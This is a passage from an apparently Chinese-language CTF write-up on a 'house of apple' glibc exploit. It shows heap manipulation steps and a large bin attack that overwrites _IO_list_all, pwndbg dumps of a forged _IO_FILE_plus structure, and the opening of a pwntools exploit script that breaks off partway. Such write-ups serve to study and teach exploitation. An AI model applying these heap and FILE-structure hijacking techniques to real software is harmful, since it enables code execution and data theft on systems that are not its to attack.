number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>add chunk1 之前。</p>\n<p><img data-src=\"/img/house-of-apple/image-20240830114550286.png\" alt=\"image-20240830114550286\"></p>\n<p>add chunk2 之前</p>\n<p><img data-src=\"/img/house-of-apple/image-20240830114747677.png\" alt=\"image-20240830114747677\"></p>\n<p><img data-src=\"/img/house-of-apple/image-20240830114835438.png\" alt=\"image-20240830114835438\"></p>\n<p>我们将 <code>0x55555555d9b0</code>  此位置合理化了。能编辑路线 <code>changsha</code> ——&gt; <code>fuzhou</code></p>\n<p>将 chunk2 放置 largebin 内，从而通过这个处于 chunk1 内部的编辑块去覆写 chunk2 即可。</p>\n<hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'h'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x4e0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x531</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>pl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>libcbase<span class=\"token operator\">+</span><span class=\"token number\">0x21b110</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>libcbase<span class=\"token operator\">+</span><span class=\"token number\">0x21b110</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>pl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>heapbase<span class=\"token operator\">+</span><span class=\"token number\">0x001eb0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>pl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token operator\">-</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-apple/image-20240830115333487.png\" alt=\"image-20240830115333487\"></p>\n<p><img data-src=\"/img/house-of-apple/image-20240830115352782.png\" alt=\"image-20240830115352782\"></p>\n<p>将 free 掉的 chunk3 的 bknextsize 覆写 io_list_all-0x20，从而将 chunk0 (fake_io) 写入 io_list_all 地址处</p>\n<hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk0 置入 unsortbin 内</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># large bin attack</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>menu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 调用 exit 触发 io_clearup 调用链从而输出 flag</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-apple/image-20240830115430774.png\" alt=\"image-20240830115430774\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pwndbg<span class=\"token operator\">></span> p <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE_plus</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0x55555555d470</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token number\">1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  file <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    _flags <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    _IO_read_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x521</span> <span class=\"token operator\">&lt;</span>error<span class=\"token operator\">:</span> Cannot access memory at address <span class=\"token number\">0x521</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    _IO_read_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e1b110</span> <span class=\"token operator\">&lt;</span>main_arena<span class=\"token operator\">+</span><span class=\"token number\">1168</span><span class=\"token operator\">></span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    _IO_read_base <span class=\"token operator\">=</span> <span class=\"token number\">0x55555555deb0</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    _IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0x55555555deb0</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    _IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e1b660</span> <span class=\"token operator\">&lt;</span>_nl_global_locale<span class=\"token operator\">+</span><span class=\"token number\">224</span><span class=\"token operator\">></span> <span class=\"token string\">\"¡\\335\\367\\377\\177\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    _IO_write_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    _IO_buf_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    _IO_buf_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    _IO_save_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    _IO_backup_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    _IO_save_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    _markers <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    _chain <span class=\"token operator\">=</span> <span class=\"token number\">0x55555555d570</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    _fileno <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    _flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    _old_offset <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    _cur_column <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    _vtable_offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token char\">'\\000'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    _shortbuf <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    _lock <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e1ca60</span> <span class=\"token operator\">&lt;</span>_IO_stdfile_2_lock<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    _offset <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    _codecvt <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    _wide_data <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7f81770</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    _freeres_list <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    _freeres_buf <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    __pad5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    _mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    _unused2 <span class=\"token operator\">=</span> <span class=\"token char\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">19</span> times<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  vtable <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e16dc0</span> <span class=\"token operator\">&lt;</span>_IO_wstrn_jumps<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pwndbg<span class=\"token operator\">></span> p <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE_plus</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0x55555555d570</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  file <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    _flags <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    _IO_read_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    _IO_read_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    _IO_read_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    _IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    _IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x1</span> <span class=\"token operator\">&lt;</span>error<span class=\"token operator\">:</span> Cannot access memory at address <span class=\"token number\">0x1</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    _IO_write_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    _IO_buf_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    _IO_buf_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    _IO_save_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    _IO_backup_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    _IO_save_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    _markers <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    _chain <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    _fileno <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    _flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    _old_offset <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    _cur_column <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    _vtable_offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token char\">'\\000'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    _shortbuf <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    _lock <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e1ca60</span> <span class=\"token operator\">&lt;</span>_IO_stdfile_2_lock<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    _offset <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    _codecvt <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    _wide_data <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    _freeres_list <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    _freeres_buf <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    __pad5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    _mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    _unused2 <span class=\"token operator\">=</span> <span class=\"token char\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">19</span> times<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  vtable <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e16bd8</span> <span class=\"token operator\">&lt;</span>_IO_cookie_jumps<span class=\"token operator\">+</span><span class=\"token number\">88</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可见程序被我们将 io_chain 劫持到我们的 fake_io 上，从而通过调用链去输出 flag</p>\n<h5 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp</h5>\n<p>在题目开启 alsr 情况写，自我认为需要去爆破 <code>point_guard_addr</code>  因此再次基础修改了一下流程，只需要爆破 2 位数即可，即 <code>1/256</code>  可以读取 flag</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> pwncli <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td 